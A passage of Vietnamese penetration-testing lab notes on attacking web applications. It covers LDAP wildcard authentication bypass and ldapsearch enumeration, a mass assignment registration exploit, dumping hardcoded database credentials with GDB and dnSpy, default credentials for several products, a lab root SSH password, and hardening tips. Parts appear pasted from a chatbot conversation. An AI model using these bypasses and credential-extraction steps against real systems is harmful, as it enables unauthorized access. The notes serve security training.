|`&`|Logical AND|
|`(cn=*)`|Always-true condition → bypass auth|

### Ví dụ Vulnerable Query

```php
(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))
```

**Bypass bằng wildcard trong username:**

```php
$username = "*";
$password = "dummy";
// → match mọi user account
```

**Bypass bằng wildcard trong password:**

```php
$username = "dummy";
$password = "*";
// → match mọi password
```

---

## Enumeration

```bash
nmap -p- -sC -sV --open --min-rate=1000 10.129.204.229
```

```
80/tcp  open  http  Apache httpd 2.4.41 (Ubuntu)
389/tcp open  ldap  OpenLDAP 2.2.X - 2.3.X
```

---

## Khai Thác

OpenLDAP chạy trên port 389 → web app trên port 80 dùng LDAP để authenticate.

**Bypass authentication:** nhập `*` vào cả username và password field → login thành công mà không cần credentials hợp lệ.

> Input `*` khiến LDAP query match tất cả entries trong directory → bypass hoàn toàn authentication.
## Question 1
After bypassing the login, what is the website "Powered by"?
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-61565f9e68d130d66b0a7344512d2582.png)
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-4368f1d9ccd782f7363c4cbe8e452e28.png)

![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-6cd175311ec7413c67dfd6c0c673ade8.png)

Kết quả này cho thấy **OpenLDAP đang cho phép anonymous bind tới Root DSE**, nhưng **không trả về `namingContexts`**, nên bạn **chưa biết Base DN**.

Điều này khá phổ biến khi máy chủ được cấu hình hạn chế.

---

## Bước 1: Thử tìm Base DN

Thử các Base DN phổ biến:

```bash
ldapsearch -x -H ldap://10.129.53.122 -b "" -s base namingContexts
```

Nếu vẫn không có:

```bash
ldapsearch -x -H ldap://10.129.53.122 -b "" -s base "+"
```

hoặc:

```bash
ldapsearch -x -H ldap://10.129.53.122 -b "" -s base "*"
```

---

## Bước 2: Kiểm tra anonymous search

Thử:

```bash
ldapsearch -x -H ldap://10.129.53.122 -b "dc=example,dc=com"
```

Nếu sai Base DN sẽ nhận được:

```text
No such object (32)
```

---

## Bước 3: Dùng nmap

Script của Nmap thường lấy được nhiều thông tin hơn:

```bash
nmap -Pn -sV -p389 --script ldap-rootdse 10.129.53.122
```

hoặc:

```bash
nmap --script ldap-search -p389 10.129.53.122
```

---

## Bước 4: Xem các cổng khác

Chạy:

```bash
nmap -Pn -sV 10.129.53.122
```

Đặc biệt xem có:

- 80
    
- 443
    
- 22
    
- 389
    
- 636
    

vì đôi khi Base DN xuất hiện trong web hoặc tài liệu.

---

## Bước 5: Nếu đã có username/password

Khi có thông tin đăng nhập, bạn có thể bind trực tiếp:

```bash
ldapsearch \
-x \
-H ldap://10.129.53.122 \
-D "uid=user,ou=People,dc=example,dc=com" \
-w password \
-b "dc=example,dc=com"
```

Điều kiện là bạn phải biết **Bind DN**, không chỉ username.

---

### Điều mình cần để hướng dẫn tiếp

Hiện tại mình **chưa thể xác định Base DN** chỉ từ kết quả bạn gửi.

Để đi tiếp, hãy gửi một trong các kết quả sau:

1. ```bash
    nmap -sV -p389 --script ldap-rootdse 10.129.53.122
    ```
    
2. Hoặc:
    
    ```bash
    nmap -sV 10.129.53.122
    ```
    
Sau khi đã có **Base DN**:

```text
dc=slap,dc=htb
```

Điều này có nghĩa cây LDAP có dạng:

```text
dc=slap,dc=htb
├── ou=People
├── ou=Users
├── ou=Groups
├── cn=admin
└── ...
```

(Tên OU thực tế còn phải khám phá.)

---

# Bước 1: Liệt kê object ở gốc

```bash
ldapsearch \
-x \
-H ldap://10.129.53.122 \
-b "dc=slap,dc=htb"
```

Nếu anonymous được phép, bạn sẽ thấy các object như:

```text
dn: dc=slap,dc=htb

dn: ou=People,dc=slap,dc=htb

dn: ou=Groups,dc=slap,dc=htb
```

---

# Bước 2: Chỉ lấy Distinguished Name (DN)

Để nhìn cấu trúc cây gọn hơn:

```bash
ldapsearch \
-x \
-H ldap://10.129.53.122 \
-b "dc=slap,dc=htb" \
dn
```

Ví dụ:

```text
dn: dc=slap,dc=htb
dn: ou=People,dc=slap,dc=htb
dn: uid=admin,ou=People,dc=slap,dc=htb
```

---

# Bước 3: Tìm người dùng

Nếu OpenLDAP cho phép anonymous search:

```bash
ldapsearch \
-x \
-H ldap://10.129.53.122 \
-b "dc=slap,dc=htb" \
"(objectClass=person)"
```

Hoặc:

```bash
ldapsearch \
-x \
-H ldap://10.129.53.122 \
-b "dc=slap,dc=htb" \
"(objectClass=inetOrgPerson)"
```

---

# Bước 4: Tìm tất cả object

```bash
ldapsearch \
-x \
-H ldap://10.129.53.122 \
-b "dc=slap,dc=htb" \
"(objectClass=*)"
```

Đây là lệnh thường dùng đầu tiên khi enumerate LDAP.

---

# Bước 5: Chỉ lấy username

```bash
ldapsearch \
-x \
-H ldap://10.129.53.122 \
-b "dc=slap,dc=htb" \
"(objectClass=*)" \
uid
```

Hoặc:

```bash
... cn
```

---

# Bước 6: Khi đã biết DN của user

Ví dụ kết quả trả về:

```text
dn: uid=admin,ou=People,dc=slap,dc=htb
```

Bạn có thể **bind** bằng tài khoản đó:

```bash
ldapsearch \
-x \
-H ldap://10.129.53.122 \
-D "uid=admin,ou=People,dc=slap,dc=htb" \
-w password \
-b "dc=slap,dc=htb"
```

Nếu password đúng:

```text
result: 0 Success
```

Nếu sai:

```text
ldap_bind: Invalid credentials (49)
```

---

# Luồng làm việc trong pentest

Thông thường, bạn sẽ làm theo trình tự sau:

```text
RootDSE
    │
    ▼
Lấy namingContexts
    │
    ▼
Base DN = dc=slap,dc=htb
    │
    ▼
ldapsearch (objectClass=*)
    │
    ▼
Tìm OU (People, Users, Groups...)
    │
    ▼
Liệt kê user
    │
    ▼
Tìm DN đầy đủ của user
    │
    ▼
LDAP Bind (-D + -w)
    │
    ▼
Truy vấn thêm hoặc sử dụng thông tin đăng nhập ở các dịch vụ khác
```

## Bước tiếp theo

Hãy chạy lệnh:

```bash
ldapsearch \
-x \
-H ldap://10.129.53.122 \
-b "dc=slap,dc=htb"
```

hoặc nếu muốn kết quả ngắn gọn hơn:

```bash
ldapsearch \
-x \
-H ldap://10.129.53.122 \
-b "dc=slap,dc=htb" \
dn
```
# SECTION 27: Web Mass Assignment Vulnerabilities

## Tổng Quan

- **Mass Assignment:** Framework tự động map user-submitted parameters vào model attributes mà không whitelist → attacker có thể gán giá trị vào các field không được phép.
- Ảnh hưởng: thay đổi dữ liệu database, bypass access control, leo quyền.

---

## Cơ Chế (Ruby on Rails Example)

```ruby
class User < ActiveRecord::Base
  attr_accessible :username, :email
end
```

Model chỉ cho phép `username` và `email`, nhưng attacker vẫn gán được `admin`:

```javascript
{ "user" => { "username" => "hacker", "email" => "hacker@example.com", "admin" => true } }
```

---

## Khai Thác — Python/SQLite App

### Phân Tích Code Lỗ Hổng

```python
# Kiểm tra confirmed khi đăng ký
try:
  if request.form['confirmed']:
    cond=True
except:
      cond=False

cur.execute('insert into users values(?,?,?)',(username,password,cond))
```

```python
# Kiểm tra login — k là cột confirmed
for i,j,k in cur.execute('select * from users where username=? and password=?',(username,password)):
  if k:
    session['user']=i
    return redirect("/home",code=302)
  else:
    return render_template('login.html',value='Account is pending for approval')
```

**Logic flaw:** `confirmed` parameter không được whitelist → attacker tự inject vào POST request.

### Exploit Steps

1. Capture POST request tới `/register` bằng Burp Suite
2. Thêm parameter `confirmed=test` vào body:

```
username=new&password=test&confirmed=test
```

3. Login với `new:test` → bypass approval → vào thẳng app.

---

## Prevention

Dùng **strong parameters** / **whitelist** — chỉ permit đúng fields:

```ruby
def user_params
  params.require(:user).permit(:username, :email)
end
```

→ Mọi field ngoài `username` và `email` bị ignore hoàn toàn.

  

## Question 1
We placed the source code of the application we just covered at /opt/asset-manager/app.py inside this exercise's target, but we changed the crucial parameter's name. SSH into the target, view the source code and enter the parameter name that needs to be manipulated to log in to the Asset Manager web application.

```Text
SSH to with user "root" and password "!x4;EW[ZLwmDx?=w"
```

Login to the machine
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-5a51027598203d56da610ff63aa8989f.png)

Identify the parameter that used to check activated user.
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-d46ee8c43a3280e7ef50cc677f885f20.png)
# SECTION 28: Attacking Applications Connecting to Services

## Tổng Quan

- Ứng dụng kết nối tới services thường chứa **connection strings** với credentials có thể bị leak.
- Mục tiêu: tìm credentials để lateral movement hoặc privilege escalation.

---
## ELF Executable Examination

- Binary `octopus_checker` kết nối tới database instances để kiểm tra availability.
- Khi chạy → lỗi driver nhưng vẫn thấy `connected` → có SQL connection string hardcoded.

### Phân Tích Với GDB + PEDA

```bash
gdb ./octopus_checker
```

```assembly
gdb-peda$ set disassembly-flavor intel
gdb-peda$ disas main
```

- Disassembly cho thấy nhiều `call` instruction trỏ tới string fragments của SQL connection string.
- Endianness → string bị reversed trong memory.
- Phát hiện `SQLDriverConnect@plt` call tại `0x5555555551b0`.

### Đặt Breakpoint Tại SQLDriverConnect

```assembly
gdb-peda$ b *0x5555555551b0
gdb-peda$ run
```

**Output — credentials lộ trong register RDX:**

```
RDX: 0x7fffffffda70 ("DRIVER={ODBC Driver 17 for SQL Server};SERVER=localhost, 1401;UID=username;PWD=password;")
```

> Sau khi lấy được credentials → thử **password reuse** với các users khác trên cùng network.

---

## DLL File Examination

- `MultimasterAPI.dll` là **.NET assembly** (framework 4.6.1).
- Kiểm tra metadata:

```powershell
Get-FileMetaData .\MultimasterAPI.dll
```

→ Thấy endpoint `api/getColleagues`, `http://localhost:8081`, method `POST`.

### Phân Tích Với dnSpy

- dnSpy cho phép đọc/edit/debug source code của .NET assembly (C#, VB).
- Navigate: `MultimasterAPI.Controllers` → `ColleagueController`
- Tìm thấy **database connection string chứa password** trong source code.

> Sau khi lấy credentials → thử **password spraying** lên các services khác.

---
## Tổng Hợp

| Loại file          | Tool       | Mục tiêu                                            |
| ------------------ | ---------- | --------------------------------------------------- |
| ELF binary (Linux) | GDB + PEDA | Breakpoint tại SQLDriverConnect → dump RDX register |
| .NET DLL (Windows) | dnSpy      | Đọc source code → tìm connection string             |

## Question 1
What credentials were found for the local database instance while debugging the octopus_checker binary? (Format username:password)
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-68c4c9329bde5bfa6aca57364ffa5f51.png)

Identify suspicious connect string.
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-9dc6c2fbebaa2d92a4a293943afebc39.png)
Set breakpoint and execute to get the password.
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-8034984ddca0f405559b6f8267544fd3.png)

# Các Ứng Dụng Đáng Chú Ý Khác

## Phương Pháp Luận

- Module dạy **methodology** áp dụng được cho mọi ứng dụng chưa biết.
- Luôn tìm: default credentials, built-in functionality, known CVEs.
- Scanner bỏ sót nhiều thứ → manual review EyeWitness report là bắt buộc.
---
## Honorable Mentions

| Ứng dụng             | Vector tấn công                                                                                             |
| -------------------- | ----------------------------------------------------------------------------------------------------------- |
| **Axis2**            | Tương tự Tomcat; upload webshell dạng `.aar`; MSF module hỗ trợ; default creds                              |
| **WebSphere**        | Default creds `system:manager` → deploy WAR file → RCE                                                      |
| **Elasticsearch**    | Nhiều CVE; thường là forgotten instance trong enterprise                                                    |
| **Zabbix**           | SQLi, auth bypass, stored XSS, LDAP disclosure, RCE; abuse Zabbix API → RCE                                 |
| **Nagios**           | RCE, root privesc, SQLi, code injection, stored XSS; default creds `nagiosadmin:PASSW0RD`                   |
| **WebLogic**         | Java EE app server; 190+ CVE; nhiều unauth RCE (2007–2021), chủ yếu Java Deserialization                    |
| **Wikis/Intranets**  | MediaWiki, SharePoint, custom intranet; tìm document repository → valid credentials                         |
| **DotNetNuke (DNN)** | C#/.NET CMS; auth bypass, directory traversal, stored XSS, file upload bypass                               |
| **vCenter**          | Quản lý ESXi; Apache Struts 2 RCE; CVE-2021-22005 (unauth OVA upload); thường chạy SYSTEM hoặc Domain Admin |

> **vCenter:** nếu có shell trên Windows appliance → `JuicyPotato` để privesc. Đây là single source of compromise cực kỳ giá trị trong môi trường enterprise.

## Question 1
Enumerate the target host and identify the running application. What application is running?
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-d4a23e1dcd1793d5a77f8d7cd6386f73.png)
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-d6e50422c45c1dd0ca1625128c0cae00.png)
## Question 2
Enumerate the application for vulnerabilities. Gain remote code execution and submit the contents of the flag.txt file on the administrator desktop.
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-1aef7156d923f021fb9297e396468068.png)

Find for flag.txt path
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-f92364f52891d42660b729705c88d72c.png)

Get flag
![](/assets/img/module19-attacking-common-application-part-3/module19-attacking-common-application-part-3-b77c3884f17f316153c1e168ae279cea.png)

# SECTION 30: Application Hardening

# Tổng Quan

- Bước đầu tiên: tạo **application inventory** chi tiết cho cả internal và external-facing apps.
- Tools hỗ trợ: Nmap, EyeWitness (miễn phí cho blue team).
- Inventory giúp phát hiện: shadow IT, deprecated apps, trial-to-free conversion (như Splunk mất auth).

---

# General Hardening Tips

|Biện pháp|Chi tiết|
|---|---|
|**Secure authentication**|Enforce strong passwords; đổi default admin password; disable default admin account; bật 2FA (bắt buộc cho admin)|
|**Access controls**|Login page không expose ra internet nếu không cần thiết; giới hạn file/folder permissions|
|**Disable unsafe features**|Ví dụ: tắt PHP code editing trong WordPress|
|**Regular updates**|Patch ngay khi vendor release|
|**Backups**|Backup website + database; lưu ở secondary location|
|**Security monitoring**|Dùng WAF, plugins monitoring; phát hiện brute-force|
|**LDAP/AD integration**|SSO qua Active Directory; giảm số lượng account; fine-grained password policy|

> Nguyên tắc chung: enable MFA, đổi default admin username, limit số lượng admin, enforce least privilege, regular assessment.

---

# Application-Specific Hardening Tips

|Ứng dụng|Danh mục|Biện pháp cụ thể|
|---|---|---|
|**WordPress**|Security monitoring|Dùng plugin WordFence (monitoring, block, country blocking, 2FA)|
|**Joomla**|Access controls|Plugin AdminExile — yêu cầu secret key để vào admin page|
|**Drupal**|Access controls|Disable/hide/move admin login page|
|**Tomcat**|Access controls|Giới hạn Manager/Host-Manager chỉ localhost; nếu expose thì IP whitelist + strong password + non-standard username|
|**Jenkins**|Access controls|Dùng Matrix Authorization Strategy plugin|
|**Splunk**|Regular updates|Đổi default password; đảm bảo có license để enforce authentication|
|**PRTG**|Secure authentication|Cập nhật thường xuyên; đổi default password|
|**osTicket**|Access controls|Giới hạn truy cập từ internet|
|**GitLab**|Secure authentication|Require admin approval cho new sign-ups; cấu hình allowed/denied domains|

---

# Kết Luận

- Nhiều tổ chức patch tốt nhưng bỏ qua **weak credentials** (Tomcat Manager, printer web UI → lấy LDAP credentials).
- Luôn kiểm tra: GitLab repo có cần public không? Ticketing system có cần expose ra ngoài không?
- Thực hiện **regular assessments** và theo dõi remediation từ pentest reports.